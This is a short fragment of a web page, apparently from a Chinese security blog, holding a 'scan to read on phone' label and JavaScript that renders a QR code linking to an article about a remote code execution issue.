手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/salia-check\_req-ntp-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 